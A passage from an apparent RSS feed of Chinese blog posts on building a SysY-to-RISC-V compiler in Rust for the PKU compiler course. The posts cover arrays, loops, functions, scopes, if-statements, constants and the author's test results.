&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;对计算机工作的深刻理解&lt;/strong&gt;：现在写代码时，仿佛能‘看’到编译器在背后默默的工作,以及它的聪明分析.这个视角非常有意思.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我想对大家说：&lt;strong&gt;这是一门能让你完成‘蜕变’的课程&lt;/strong&gt;。不要畏难，跟着课程设计一步步来，你绝对会比想象中更强大。每一次当你看到自己的编译器通过一章时,你会觉得一切努力都是值得的.&lt;/p&gt;
&lt;p&gt;&amp;quot;这里不是终点，而是一个新的起点。致敬每一位计算机世界的造物主!&amp;quot;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;统计了一下这个工程的代码量,一共有两千五百多行的Rust, 以及一些.lalrpop.最近短短一个月写的Rust,已经超过我以前写过的C了.Rust,真的不错!&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;我们比自己想象中的还要强&lt;/strong&gt;😎&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sat, 30 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv9：数组 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv9/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv9/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv9/&quot;&gt;https://tankimzeg.top/blog/compiler/lv9/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;按照我自己的写法的sysy.lalrpop总是出各种问题,匪夷所思.最后是在没招了,我只好参考了示例编译器的lalrpop写法,这才解决问题.顺便一提,示例编译器的rust写法非常抽象,我都看不太懂.我对自己的代码风格还是很满意的,既有一定的抽象,又清晰可读.别的学生的代码已经变成屎山了,中后期对我找bug的参考意义就不大了.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由于经常要测试,不管是手敲命令还是上下翻找都不方便.所以我向&lt;code&gt;bashrc&lt;/code&gt;添加命令别名(alias),很好用:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;echo &amp;#39;alias test-koopa=&amp;quot;cargo run -- -koopa /root/compiler/tests/hello.c -o /root/compiler/tests/hello.koopa&amp;quot;&amp;#39;&amp;gt;&amp;gt; ~/.bash_aliases
echo &amp;#39;alias test-riscv=&amp;quot;cargo run -- -riscv /root/compiler/tests/hello.c -o /root/compiler/tests/hello.S&amp;quot;&amp;#39;  &amp;gt;&amp;gt; ~/.bash_aliases

echo &amp;#39;chapter_test(){ autotest -$1 -s lv$2 /root/compiler; }&amp;#39; &amp;gt;&amp;gt; ~/.bash_aliases
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这章各种指针乱飞,是最让我头大的.经常出现指针越界的问题(返回值显示-11),Debug了很久,而且懒得自己链接调试,用的是&lt;code&gt;putint&lt;/code&gt;库函数打印调试....最后硬是靠着二分法看着汇编找到了一些寄存器分配/函数参数的冲突问题.后续,我搞了一个Makefile来编译链接,推荐大家使用,减少编译等待的时间,我的电脑比较差劲,每次autotest都得等二十多秒.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;running test &amp;quot;00_local_arr_1d&amp;quot; ... PASSED
running test &amp;quot;01_local_arr_nd&amp;quot; ... PASSED
running test &amp;quot;02_global_arr&amp;quot; ... PASSED
running test &amp;quot;03_arr_init_1d&amp;quot; ... PASSED
running test &amp;quot;04_arr_init_nd&amp;quot; ... PASSED
running test &amp;quot;05_global_arr_init&amp;quot; ... PASSED
running test &amp;quot;06_long_array&amp;quot; ... PASSED
running test &amp;quot;07_const_array&amp;quot; ... PASSED
running test &amp;quot;08_arr_access&amp;quot; ... PASSED
running test &amp;quot;09_const_arr_read&amp;quot; ... PASSED
running test &amp;quot;10_arr_in_loop&amp;quot; ... PASSED
running test &amp;quot;11_arr_params&amp;quot; ... PASSED
running test &amp;quot;12_more_arr_params&amp;quot; ... PASSED
running test &amp;quot;13_complex_arr_params&amp;quot; ... PASSED
running test &amp;quot;14_arr_lib_funcs&amp;quot; ... PASSED
running test &amp;quot;15_sort1&amp;quot; ... PASSED
running test &amp;quot;16_sort2&amp;quot; ... PASSED
running test &amp;quot;17_sort3&amp;quot; ... PASSED
running test &amp;quot;18_sort4&amp;quot; ... PASSED
running test &amp;quot;19_sort5&amp;quot; ... PASSED
running test &amp;quot;20_sort6&amp;quot; ... PASSED
running test &amp;quot;21_sort7&amp;quot; ... PASSED
PASSED (22/22)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;终于通过了,真是不容易.虽然这里通过了,但在此基础上,我还修了几个bug.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 25 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv7: while语句 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv7/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv7/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv7/&quot;&gt;https://tankimzeg.top/blog/compiler/lv7/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;处理while&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Stmt ::= ...
       | ...
       | ...
       | ...
       | &amp;quot;while&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; Stmt
       | ...;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置三个新的&lt;code&gt;BasicBlock&lt;/code&gt;: &lt;code&gt;while_entry&lt;/code&gt;/&lt;code&gt;while_body&lt;/code&gt;/&lt;code&gt;while_end&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;break和continue&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Stmt ::= ...
       | ...
       | ...
       | ...
       | ...
       | &amp;quot;break&amp;quot; &amp;quot;;&amp;quot;
       | &amp;quot;continue&amp;quot; &amp;quot;;&amp;quot;
       | ...;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在&lt;code&gt;break&lt;/code&gt;和&lt;code&gt;continue&lt;/code&gt;之后,生成一些不可达的块来编译后续代码,防止崩溃,这么做是最省事的.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 44.02s
running test &amp;quot;00_while&amp;quot; ... PASSED
running test &amp;quot;01_while_pow&amp;quot; ... PASSED
running test &amp;quot;02_while_false&amp;quot; ... PASSED
running test &amp;quot;03_while_true&amp;quot; ... PASSED
running test &amp;quot;04_while_if&amp;quot; ... PASSED
running test &amp;quot;05_if_while&amp;quot; ... PASSED
running test &amp;quot;06_nested_while&amp;quot; ... PASSED
running test &amp;quot;07_break&amp;quot; ... PASSED
running test &amp;quot;08_if_break&amp;quot; ... PASSED
running test &amp;quot;09_continue&amp;quot; ... PASSED
running test &amp;quot;10_if_continue&amp;quot; ... PASSED
running test &amp;quot;11_complex&amp;quot; ... PASSED
PASSED (12/12)
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 22 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv8: 函数和全局变量 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv8/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv8/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv8/&quot;&gt;https://tankimzeg.top/blog/compiler/lv8/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;本章中, 你将在上一章的基础上, 实现一个能够处理函数 (包括 SysY 库函数) 和全局变量的编译器.&lt;/p&gt;
&lt;p&gt;那么,我的编译器将越来越有用!&lt;/p&gt;
&lt;h2&gt;函数定义和调用&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;CompUnit    ::= [CompUnit] FuncDef;

FuncDef     ::= FuncType IDENT &amp;quot;(&amp;quot; [FuncFParams] &amp;quot;)&amp;quot; Block;
FuncType    ::= &amp;quot;void&amp;quot; | &amp;quot;int&amp;quot;;
FuncFParams ::= FuncFParam {&amp;quot;,&amp;quot; FuncFParam};
FuncFParam  ::= BType IDENT;

UnaryExp    ::= ...
              | IDENT &amp;quot;(&amp;quot; [FuncRParams] &amp;quot;)&amp;quot;
              | ...;
FuncRParams ::= Exp {&amp;quot;,&amp;quot; Exp};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;重新设计了符号表,由于有多个函数,重构了处理函数的代码,使其能够复用.另外,函数需要将全局符号和参数加入其符号表中.对于参数,需要为其分配存储空间&lt;/p&gt;
&lt;h2&gt;目标代码生成&lt;/h2&gt;
&lt;p&gt;还记得在汇编语言中:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如何定义函数?&lt;/li&gt;
&lt;li&gt;如何调用函数&lt;/li&gt;
&lt;li&gt;如何传递/接受函数参数&lt;/li&gt;
&lt;li&gt;如何传递/接受返回值,以及从函数中返回?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这应该是本章最复杂的部分了.&lt;/p&gt;
&lt;h3&gt;函数的调用和返回&lt;/h3&gt;
&lt;p&gt;与CS:APP相比,这里要求的掌握程度就更高了.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在汇编层面, “函数调用和返回” 并不包括参数和返回值的传递.&lt;/li&gt;
&lt;li&gt;函数的返回地址保存在寄存器 &lt;code&gt;ra&lt;/code&gt; 中.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;把函数之间的调用关系想象成一个图 (即调用图), 那么一个永远不会调用其他函数的函数就位于图中的叶子结点, 我们把这种函数称为叶子函数.与之相对的, 还有非叶子函数.&lt;/p&gt;
&lt;p&gt;在 RISC-V 中, 非叶子函数通常需要在 prologue 中将自己的 &lt;code&gt;ra&lt;/code&gt; 寄存器保存到栈帧中. 在 epilogue 中, 非叶子函数需要先从栈帧中恢复 &lt;code&gt;ra&lt;/code&gt; 寄存器, 之后才能执行 &lt;code&gt;ret&lt;/code&gt; 指令.&lt;/p&gt;
&lt;h3&gt;传递/接受参数&lt;/h3&gt;
&lt;p&gt;RISC-V有8个寄存器: &lt;code&gt;a0&lt;/code&gt; - &lt;code&gt;a7&lt;/code&gt; 用来在函数调用时传递函数的非浮点参数.函数的前8个参数必须按照从前到后的顺序依次放入 &lt;code&gt;a0&lt;/code&gt; 到 &lt;code&gt;a7&lt;/code&gt; 寄存器.&lt;/p&gt;
&lt;p&gt;如果函数参数超过8个,超过的部分放在内存(栈帧)中.而且是从栈帧的最底部开始(&lt;code&gt;sp+0&lt;/code&gt;,&lt;code&gt;sp+4&lt;/code&gt;)开始.&lt;/p&gt;
&lt;h2&gt;SysY库函数&lt;/h2&gt;
&lt;p&gt;在 Koopa IR 中, 所有被 &lt;code&gt;call&lt;/code&gt; 指令引用的函数必须提前声明, 否则会出现错误. 你可以使用 &lt;code&gt;decl&lt;/code&gt; 语句来预先声明所有的库函数.&lt;/p&gt;
&lt;p&gt;我们需要用&lt;code&gt;FuncData::new(..)&lt;/code&gt;来声明函数.
此外,在全局符号表中加入这些函数的声明.&lt;/p&gt;
&lt;h2&gt;全局变量和常量&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;CompUnit ::= [CompUnit] (Decl | FuncDef);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改lexer时遇到了莫名其妙的问题:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;CompUnit: CompUnit = {
  Decl =&amp;gt; CompUnit::Decl(&amp;lt;&amp;gt;),
  FuncDef =&amp;gt; CompUnit::Func(&amp;lt;&amp;gt;),
};
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;the top 1 token(s) from the stack and produce a `BType`. This might then yield a parse  
tree like  
&amp;quot;int&amp;quot; ╷ Comma&amp;lt;VarDef&amp;gt; &amp;quot;;&amp;quot;  
├─BType─┘ │  
└─VarDecl─────────────────┘

Alternatively, the parser could execute the production at  
E:\Documents\learnRust\compiler\src\sysy.lalrpop:34:3: 34:26, which would consume the  
top 1 token(s) from the stack and produce a `FuncType`. This might then yield a parse  
tree like  
&amp;quot;int&amp;quot; ╷ Ident &amp;quot;(&amp;quot; Comma&amp;lt;FuncFParam&amp;gt; &amp;quot;)&amp;quot; Block  
├─FuncType─┘ │  
└─FuncDef────────────────────────────────────────┘

See the LALRPOP manual for advice on making your grammar LR(1).
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这paser不太智能啊,&lt;code&gt;Decl&lt;/code&gt;后面没有括号,这也区分不了吗?&lt;/p&gt;
&lt;h3&gt;目标代码生成&lt;/h3&gt;
&lt;p&gt;RISC-V如何存取全局变量?借助 &lt;a href=&quot;https://godbolt.org/&quot;&gt;https://godbolt.org/&lt;/a&gt; RISC-V rv32gc clang(trunck)我发现&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;main:
        lui     a1, %hi(x)
        lw      a0, %lo(x)(a1)
        addi    a0, a0, 1
        sw      a0, %lo(x)(a1)
        ret
  
a:
        .word   2

x:
        .word   0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这就是存取全局变量的方法的,先获取变量的地址,再向地址写.当然也可以这样:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;la t0, var 
lw t0, 0(t0) 
sw t0, 0(sp)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 21.30s
running test &amp;quot;00_int_func&amp;quot; ... PASSED
running test &amp;quot;01_void_func&amp;quot; ... PASSED
running test &amp;quot;02_params&amp;quot; ... PASSED
running test &amp;quot;03_more_params&amp;quot; ... PASSED
running test &amp;quot;04_param_name&amp;quot; ... PASSED
running test &amp;quot;05_func_name&amp;quot; ... PASSED
running test &amp;quot;06_complex_call&amp;quot; ... PASSED
running test &amp;quot;07_recursion&amp;quot; ... PASSED
running test &amp;quot;08_lib_funcs&amp;quot; ... PASSED
running test &amp;quot;09_globals&amp;quot; ... PASSED
running test &amp;quot;10_complex&amp;quot; ... PASSED
running test &amp;quot;11_short_circuit&amp;quot; ... PASSED
PASSED (12/12)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lv9之前的测试全部通过，已经看到胜利的曙光了!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 22 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv5：语句块和作用域 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv5/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv5/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv5/&quot;&gt;https://tankimzeg.top/blog/compiler/lv5/&lt;/a&gt;&lt;/blockquote&gt; &lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Stmt ::= LVal &amp;quot;=&amp;quot; Exp &amp;quot;;&amp;quot;
       | [Exp] &amp;quot;;&amp;quot;
       | Block
       | &amp;quot;return&amp;quot; [Exp] &amp;quot;;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本节内容不多,而且在建立符号表的那章我就思考过符号表的建立位置以及语句块和作用域的问题.本以为能很快解决,但没想到在智能指针等细节还是纠缠了很久.&lt;/p&gt;
&lt;p&gt;智能指针及其配套方法还是难,好在有Chat-GPT5的帮助,最终还是写出来了.&lt;/p&gt;
&lt;p&gt;我重构了符号表的数据结构,用&lt;code&gt;Rc&amp;lt;RefCell&amp;lt;SymbolTable&amp;gt;&amp;gt;&lt;/code&gt;来减小复制开销.这样,总体来说性能还是不错的.&lt;/p&gt;
&lt;p&gt;欣赏一下结果:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 29.28s
running test &amp;quot;0_block&amp;quot; ... PASSED
running test &amp;quot;1_ret_from_block&amp;quot; ... PASSED
running test &amp;quot;2_blocks&amp;quot; ... PASSED
running test &amp;quot;3_exp&amp;quot; ... PASSED
running test &amp;quot;4_empty_exp&amp;quot; ... PASSED
running test &amp;quot;5_scope&amp;quot; ... PASSED
running test &amp;quot;6_complex_scopes&amp;quot; ... PASSED
PASSED (7/7)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还有一个&lt;code&gt;koopa IR&lt;/code&gt;的语法细节:如果block里面没有内容,应该是不能给该block命名的:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fun @main(): i32 {
%entry:
  ret 1

%0:

%1:

%2:
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样是不行的.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 20 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv6：if语句 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv6/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv6/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv6/&quot;&gt;https://tankimzeg.top/blog/compiler/lv6/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;按照&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;Stmt ::= ...
       | ...
       | ...
       | &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; Stmt [&amp;quot;else&amp;quot; Stmt]
       | ...;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;遇到一些语法二义性导致的问题：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
    The following symbols can be reduced in two ways:
      &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; Stmt &amp;quot;else&amp;quot; Stmt

    They could be reduced like so:
      &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; Stmt &amp;quot;else&amp;quot; Stmt
      │                └─Stmt──────────────┘           │
      └─Stmt───────────────────────────────────────────┘

    Alternatively, they could be reduced like so:
      &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; Stmt &amp;quot;else&amp;quot; Stmt
      │                └─Stmt──────────────────────────┤
      └─Stmt───────────────────────────────────────────┘

    LALRPOP does not yet support ambiguous grammars. See the LALRPOP manual for
    advice on making your grammar unambiguous.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我想不出怎么解决,只好求助AI:
原因与设计思路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;定义不变式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MatchedStmt：内部不再存在“悬空的 if”（即没有任何分支末尾还缺 else）。&lt;/li&gt;
&lt;li&gt;UnmatchedStmt：以一个“悬空的 if”收尾，右端还可能被后续 else 吸收。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;为什么在“把 else 绑定到最近未匹配 if”的产生式里写 UnmatchedStmt -&amp;gt; if (E) MatchedStmt else UnmatchedStmt&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;then_m 必须是 MatchedStmt：这样保证 then 分支内部不再携带悬空 if，避免 else 去抢绑定 then 分支里更早的 if，确保“else 只能往右绑定最近的未匹配 if”。&lt;/li&gt;
&lt;li&gt;else_u 是 UnmatchedStmt：把“悬空”状态继续向右传播。如果 else 分支自身以悬空 if 结尾，那么整个 if 仍然是 Unmatched，留给更靠右的 else 去匹配；如果 else 分支是 Matched，则下一步可整体归约为 Matched 的 if-else。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;// ...existing code...
Stmt: Stmt = {
  MatchedStmt =&amp;gt; &amp;lt;&amp;gt;,
  UnmatchedStmt =&amp;gt; &amp;lt;&amp;gt;,
};

MatchedStmt: Stmt = {
  // if-else，then/else 两边都“已匹配”
  &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; &amp;lt;exp: Exp&amp;gt; &amp;quot;)&amp;quot; &amp;lt;then_m: MatchedStmt&amp;gt; &amp;quot;else&amp;quot; &amp;lt;else_m: MatchedStmt&amp;gt; =&amp;gt;
    Stmt::Cond(Cond{ exp, then_branch: Box::new(then_m), else_branch: Some(Box::new(else_m)) }),

  // 其它“非 if 缺 else”的语句都属于已匹配
  &amp;quot;return&amp;quot; &amp;lt;exp: Exp?&amp;gt; &amp;quot;;&amp;quot; =&amp;gt; Stmt::Ret(&amp;lt;&amp;gt;),
  &amp;lt;id: Ident&amp;gt; &amp;quot;=&amp;quot; &amp;lt;exp: Exp&amp;gt; &amp;quot;;&amp;quot; =&amp;gt; Stmt::LVal(&amp;lt;&amp;gt;),
  Block =&amp;gt; Stmt::Block(&amp;lt;&amp;gt;),
  &amp;lt;exp: Exp?&amp;gt; &amp;quot;;&amp;quot; =&amp;gt; Stmt::Exp(&amp;lt;&amp;gt;),
};

UnmatchedStmt: Stmt = {
  // 缺少 else 的 if
  &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; &amp;lt;exp: Exp&amp;gt; &amp;quot;)&amp;quot; &amp;lt;then_s: Stmt&amp;gt; =&amp;gt;
    Stmt::Cond(Cond{ exp, then_branch: Box::new(then_s), else_branch: None }),

  // 把 else 绑定到最近的未匹配 if
  &amp;quot;if&amp;quot; &amp;quot;(&amp;quot; &amp;lt;exp: Exp&amp;gt; &amp;quot;)&amp;quot; &amp;lt;then_m: MatchedStmt&amp;gt; &amp;quot;else&amp;quot; &amp;lt;else_u: UnmatchedStmt&amp;gt; =&amp;gt;
    Stmt::Cond(Cond{ exp, then_branch: Box::new(then_m), else_branch: Some(Box::new(else_u)) }),
};
// ...existing code...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;那么可以进入下一步了&lt;/p&gt;
&lt;h3&gt;IR生成&lt;/h3&gt;
&lt;p&gt;Koopa IR 中, 控制转移指令有两种:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;br 条件, 目标1, 目标2&lt;/code&gt; 指令:&lt;/strong&gt; 进行条件分支, 其中 &lt;code&gt;条件&lt;/code&gt; 为整数, 两个目标为基本块. 如果 &lt;code&gt;条件&lt;/code&gt; 非 0, 则跳转到 &lt;code&gt;目标1&lt;/code&gt; 基本块的开头执行, 否则跳转到 &lt;code&gt;目标2&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;jump 目标&lt;/code&gt; 指令:&lt;/strong&gt; 进行无条件跳转, 其中 &lt;code&gt;目标&lt;/code&gt; 为基本块. 直接跳转到 &lt;code&gt;目标&lt;/code&gt; 基本块的开头执行.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在之前的 Koopa IR 程序中, 只有一个入口基本块 &lt;code&gt;%entry&lt;/code&gt;. 现在, 你可以通过划分新的基本块, 来标记控制流转移的目标.&lt;/p&gt;
&lt;p&gt;需要注意的是, 基本块的结尾必须是 &lt;code&gt;br&lt;/code&gt;, &lt;code&gt;jump&lt;/code&gt; 或 &lt;code&gt;ret&lt;/code&gt; 指令其中之一 (并且, 这些指令只能出现在基本块的结尾).这也是上次空块编译失败的原因.这点和汇编语言中 label 的概念有所不同.&lt;/p&gt;
&lt;p&gt;所以,这里就需要想清楚了,如果if的stmt里面嵌套if分支,对应的koopa  ir  需要展开,jump语句就不能放在第一层分支里面,而要放在最后一层分支下面.遍历时,要求函数返回遍历完成时所在的&lt;code&gt;BasicBlock&lt;/code&gt;,才能解决这个问题.&lt;/p&gt;
&lt;p&gt;另一个细节是为了避免在&lt;code&gt;ret&lt;/code&gt;后面加上跳转语句,遇到&lt;code&gt;Stmt::Ret&lt;/code&gt;时新增一个不可达的&lt;code&gt;Basickblock&lt;/code&gt;,跳转语句放在这个不可达的bb下面就能保持这一主体逻辑不被破坏.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 19.21s
running test &amp;quot;0_if&amp;quot; ... PASSED
running test &amp;quot;1_if_else&amp;quot; ... PASSED
running test &amp;quot;2_multiple_if_else&amp;quot; ... PASSED
running test &amp;quot;3_nested_if&amp;quot; ... PASSED
running test &amp;quot;4_logical&amp;quot; ... PASSED
running test &amp;quot;5_more_logical&amp;quot; ... PASSED
running test &amp;quot;6_multiple_returns&amp;quot; ... PASSED
running test &amp;quot;7_complex&amp;quot; ... PASSED
PASSED (8/8)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;目标代码生成&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;bnez 寄存器, 目标&lt;/code&gt;:&lt;/strong&gt; 判断 &lt;code&gt;寄存器&lt;/code&gt; 的值, 如果不为 0, 则跳转到目标, 否则继续执行下一条指令.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;j 目标&lt;/code&gt;:&lt;/strong&gt; 无条件跳转到 &lt;code&gt;目标&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;又被折磨了很久...已经懒得写了...&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    Finished release [optimized] target(s) in 23.68s
running test &amp;quot;0_if&amp;quot; ... PASSED
running test &amp;quot;1_if_else&amp;quot; ... PASSED
running test &amp;quot;2_multiple_if_else&amp;quot; ... PASSED
running test &amp;quot;3_nested_if&amp;quot; ... PASSED
running test &amp;quot;4_logical&amp;quot; ... PASSED
running test &amp;quot;5_more_logical&amp;quot; ... PASSED
running test &amp;quot;6_multiple_returns&amp;quot; ... PASSED
running test &amp;quot;7_complex&amp;quot; ... PASSED
PASSED (8/8)
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Wed, 20 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Lv4：常量和变量 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/lv4/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/lv4/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/lv4/&quot;&gt;https://tankimzeg.top/blog/compiler/lv4/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;进入第4章节, 
编译器将可以处理如下的 SysY 程序:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main() {
  const int x = 233 * 4;
  int y = 10;
  y = y + x / 2;
  return y;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;教程给出了ebnf: &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-ebnf&quot;&gt;CompUnit      ::= FuncDef;

Decl          ::= ConstDecl | VarDecl;
ConstDecl     ::= &amp;quot;const&amp;quot; BType ConstDef {&amp;quot;,&amp;quot; ConstDef} &amp;quot;;&amp;quot;;
BType         ::= &amp;quot;int&amp;quot;;
ConstDef      ::= IDENT &amp;quot;=&amp;quot; ConstInitVal;
ConstInitVal  ::= ConstExp;
VarDecl       ::= BType VarDef {&amp;quot;,&amp;quot; VarDef} &amp;quot;;&amp;quot;;
VarDef        ::= IDENT | IDENT &amp;quot;=&amp;quot; InitVal;
InitVal       ::= Exp;

FuncDef       ::= FuncType IDENT &amp;quot;(&amp;quot; &amp;quot;)&amp;quot; Block;
FuncType      ::= &amp;quot;int&amp;quot;;

Block         ::= &amp;quot;{&amp;quot; {BlockItem} &amp;quot;}&amp;quot;;
BlockItem     ::= Decl | Stmt;
Stmt          ::= LVal &amp;quot;=&amp;quot; Exp &amp;quot;;&amp;quot;
                | &amp;quot;return&amp;quot; Exp &amp;quot;;&amp;quot;;

Exp           ::= LOrExp;
LVal          ::= IDENT;
PrimaryExp    ::= &amp;quot;(&amp;quot; Exp &amp;quot;)&amp;quot; | LVal | Number;
Number        ::= INT_CONST;
UnaryExp      ::= PrimaryExp | UnaryOp UnaryExp;
UnaryOp       ::= &amp;quot;+&amp;quot; | &amp;quot;-&amp;quot; | &amp;quot;!&amp;quot;;
MulExp        ::= UnaryExp | MulExp (&amp;quot;*&amp;quot; | &amp;quot;/&amp;quot; | &amp;quot;%&amp;quot;) UnaryExp;
AddExp        ::= MulExp | AddExp (&amp;quot;+&amp;quot; | &amp;quot;-&amp;quot;) MulExp;
